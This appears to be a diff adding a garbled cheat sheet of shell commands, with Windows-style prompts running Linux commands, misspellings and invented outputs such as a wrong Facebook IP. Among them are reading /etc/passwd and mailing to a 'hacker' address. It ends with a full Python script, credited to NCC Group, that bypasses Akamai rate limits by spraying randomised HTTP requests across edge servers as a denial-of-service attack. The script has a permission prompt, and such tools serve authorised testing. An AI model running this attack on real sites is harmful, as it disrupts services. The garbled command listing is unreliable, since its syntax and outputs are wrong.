@@ -1,0 +1,232 @@
+COMMAND
+Ping www.facebook.com
+Seq
+C:/Users>seq 199999
+C:/Users> Ping www.facebook.com
+Pingin facebook.com [34.56.72.32] with 32 bytes of data:
+Replay  from 34.56.72.32: bytes=32 time=10ms TTL=52
+Replay  from 34.56.72.32: bytes=32 time=11ms TTL=52
+Replay  from 34.56.72.32: bytes=32 time=12ms TTL=52
+Ping -t -1 56272 126.0.0.1
+C:/Users> Ping -t -1 56272 126.0.0.1
+Pwd
+C:/Users>pwd
+/data/data/com.command/files/home
+Pkg install python
+C:/Users>pkg install python
+1%[ #................ ]
+Pkg install linux
+C:/Users>pkg install linux
+2%[ #................ ]
+Python install python
+C:/Users>python install python
+Mkdir new_directory
+C:/Users> $ mkdir new_directory
+C:/Users>
+ ls
+C:/Users> ls
+new_directory
+C:/Users>
+touch demo.txt
+touch demo1.txt demo2.txt
+ ls
+C:/Users>touch demo.txt
+C:/Users>touch demo1.txt demo2.txt
+C:/Users>ls
+demo.txt  demo1.txt  demo2.txt  new_directory
+ID
+C:/Users>id
+1.	id --help  
+2.	man id
+File
+C:/Users>file --help
+Cut
+C:/Users>cut -d- -f2 mark.txt
+find . -tehogi "*.pdf"
+C:/Users>find . -tehogi "*.pdf"
+Locate
+C:/Users>locate system.conf
+Sleep
+C:/Users>sleep 4
+Time
+C:/Users>time
+zcat inbox.html
+C:/Users>zcat inbox.html
+Df
+C:/Users>df
+Mount
+C:/Users>mount
+Clear
+C:/Users>clear
+ip a or ip addr
+C:/Users>ip a
+C:/Users>ip addr
+mail -s "Subject" 
+C:/Users>mail -s "Subject" hackertehogi@gmail.com
+Host
+C:/Users>host facebook.com
+Whoami 
+C:/Users>whoami
+Who
+C:/Users>who
+Who am i
+C:/Users>who am i
+W
+C:/Users>w
+Su -jtp
+C:/Users>su – jtp
+tail /etc/passwd 
+C:/Users> tail /etc/passwd
+3.	 useradd -m -d /home/<userName> -c "<userName>" <userName> 
+4.	 
+useradd -m -d /home/xyz -c "xyz" xyz  
+Useradd -D  
+5.	C:/Users> useradd -D  
+ls -al /etc/skel 
+C:/Users> ls -al /etc/skel
+6.	C:/Users> groupadd php  
+7.	groupadd java  
+8.	groupadd android  
+9.	groupadd spring  
+echo $REPLY
+C:/Users>echo $REPLY
+$ cmatrix
+C:/Users>pkg install cmatrix
+C:/Users>cmatrix
+telnet towel.blinkenlights.nl
+C:/Users> telnet towel.blinkenlights.nl
+sudo apt-get install fortune
+fortune
+C:/Users> fortune
+C:/Users> pkg install fortune
+HELLO
+C:/Users>hello!
+Cal
+C:/Users>cal
+March 2021
+Su Mo Tu We Th Fr Sa
+    1  2  3  4  5  6
+ 7  8  9 10 11 12 13
+14 15 16 17 18 19 20
+21 22 23 24 25 26 27
+28 29 30 31
+Rev
+C:/Users>rev
+CLinoxide
+CedikoniL
+Cowsay hope you enjoyed the article!
+C:/Users>cowsay hope you enjoyed the article!
+Date
+C:/Users>date
+Tue Mar 23 13:44:05 CET 2021
+History
+C:/Users>history
+Hello
+C:/Users>echo “hello"
+Hello
+Ls -al
+C:/Users>ls -al
+read -s -p "Enter password: "  
+C:/Users>read -s -p "Enter password: "  
+C:/Users>echo $REPLAY
+
+!2
+C:/Users>!2
+Exit
+C:/Users>exit();
+C:/Users>exit
+Nspackage
+
+C:/Users>nspackage
+C:/Users>python nspackage.py
+C:/Users>python arp-rl-bypass.py
+arp-rl-bypass.py
+
+#!/usr/bin/python
+print "Akamai Reverse Proxy Rate Limit Bypass v 0.1"
+print "By Darren McDonald, NCC Group, 2012"
+print ""
+import sys
+import random
+import time
+import socket
+import thread
+import string
+def randString(size):
+ chars=string.ascii_uppercase + string.digits
+ return ''.join(random.choice(chars) for x in range(size))
+def replace_all(text, dic):
+ for i, j in dic.iteritems():
+ text = text.replace(i, j)
+ return text
+def doHTTPRequest( ip, HTTPRequest, count):
+ uniqRequest = HTTPRequest
+ uniqRequest = uniqRequest.replace('[RANDOM]',randString(12))
+ sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
+ sock.settimeout(60)
+ sock.connect( (ip, 80) )
+ sock.send(uniqRequest)
+ statusCode = sock.recv(12)
+ print str(count) + ": " + statusCode
+ if statusCode == "HTTP/1.1 403":
+ print "Being rate limited, recommend you restart with better Akamai Map";
+ #print "[DB] Thread Ended"
+#usage
+if len(sys.argv) < 5:
+ print "Usage: ./arp-rl-bypass.py [akamaimap] [rate] [sendlimit] [request1] 
+[request2]..."
+ print "akamaimap This should be a newline delimited list of Akamai servers"
+ print " This can be generated with akamai-dns-scan.py and sort | uniq"
+print " and piping it into a file. The script will send each request"
+ print " to a random IP address from this list"
+ print "rate The number of requests per second to send"
+ print "sendlimit Exit when this many requests have been sent"
+ print "requestN One or more files containing HTTP requests to be randomly selected"
+ print " from. Use the keyword [RANDOM] in the URL to ensure a random URL is "
+ print " used in order to bypass caching."
+ print " e.g. GET /search.php?q=[RANDOM] HTTP/1.1 etc"
+ exit()
+#map argvs
+sleepTime = (float)(1/float(sys.argv[2]))
+print "!!Stop and Think!!"
+print "This program will attempt a destination distributed denial of service attack with the 
+following settings"
+print "Akamai Map: " + sys.argv[1]
+print "Request Rate: " + sys.argv[2] + " per second"
+print "Number of Requests: " + sys.argv[3]
+for x in range(4, len(sys.argv)):
+ print "Request File " + str(x-3) + " - " + sys.argv[x]
+print ""
+print "Do you have permission to run this attack?"
+print "Have you set the throttling low enough to ensure the target can handle?"
+print "Are you certain the answer to these questions is yes?"
+answer = raw_input("[y/n] : ")
+if answer != 'y' and answer != 'Y':
+ exit()
+# Load Akamai Map into memeory
+akamaiMap = []
+HTTPRequestList = []
+akamaiMapFile = open(sys.argv[1], 'r')
+for line in akamaiMapFile:
+ akamaiMap.append( line.rstrip('\n') )
+for x in range(5, len(sys.argv)):
+ request = ""
+ HTTPRequestFile = open(sys.argv[x])
+ for line in HTTPRequestFile:
+ request += line
+ HTTPRequestList.append(request)
+# Begin Attack
+requests = int(sys.argv[3])
+if requests > 1000:
+ requests = 1000
+if sleepTime < 0.025:
+ sleepTime = 0.025
+count = 1
+while requests > 0:
+ akamaiEdgeIP = akamaiMap[random.randrange(0, len(akamaiMap))]
+ thread.start_new_thread( doHTTPRequest, (akamaiEdgeIP, 
+HTTPRequestList[random.randrange(0,len(HTTPRequestList))], count ) )
+ requests -= 1
+ time.sleep(sleepTime)
+ count += 1
+time.sleep(60)
